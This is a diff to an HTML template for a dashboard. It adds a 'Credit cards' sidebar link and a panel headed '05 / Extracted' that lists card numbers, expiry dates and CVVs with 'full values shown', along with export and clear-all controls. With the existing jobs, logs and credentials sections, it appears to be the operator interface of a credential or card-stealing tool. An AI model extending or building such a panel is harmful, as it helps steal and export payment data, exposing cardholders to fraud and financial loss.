@@ -20,6 +20,7 @@
       <a class="rail-btn" href="#jobs" data-label="Recent jobs" aria-label="Recent jobs">≋</a>
       <a class="rail-btn" href="#logs" data-label="Output logs" aria-label="Output logs">▤</a>
       <a class="rail-btn" href="#credentials" data-label="Credentials" aria-label="Credentials">◇</a>
+      <a class="rail-btn" href="#credit-cards" data-label="Credit cards" aria-label="Credit cards">💳</a>
     </nav>
     <div class="rail-bottom">
       <button class="rail-btn" type="button" data-settings-toggle data-label="Settings" aria-label="Settings" aria-controls="settings-menu" aria-expanded="false">⚙</button>
@@ -340,6 +341,21 @@
           <form method="post" action="/credentials/clear-all" data-confirm="Delete ALL credentials?">
             <input type="hidden" name="csrf" value="{{ csrf }}">
             <button class="danger" type="submit" id="clear-btn" disabled>Clear credentials</button>
+          </form>
+        </div>
+      </section>
+
+      <section class="panel credentials-panel" id="credit-cards">
+        <div class="panel-head">
+          <div><p class="kicker">05 / Extracted</p><h2>Credit cards</h2><p class="panel-note">Format: cardnum|month|year|cvv — full values shown.</p></div>
+          <span class="head-icon" aria-hidden="true">💳</span>
+        </div>
+        <div class="credentials-container"><div id="credit-cards-list" class="credentials-list"><div class="empty">No credit cards yet.</div></div></div>
+        <div class="credentials-actions">
+          <a class="button-link ghost is-disabled" href="/credit-cards/export" id="credit-cards-export-btn" aria-disabled="true" tabindex="-1">Export</a>
+          <form method="post" action="/credit-cards/clear-all" data-confirm="Delete ALL credit cards?">
+            <input type="hidden" name="csrf" value="{{ csrf }}">
+            <button class="danger" type="submit" id="credit-cards-clear-btn" disabled>Clear credit cards</button>
           </form>
         </div>
       </section>
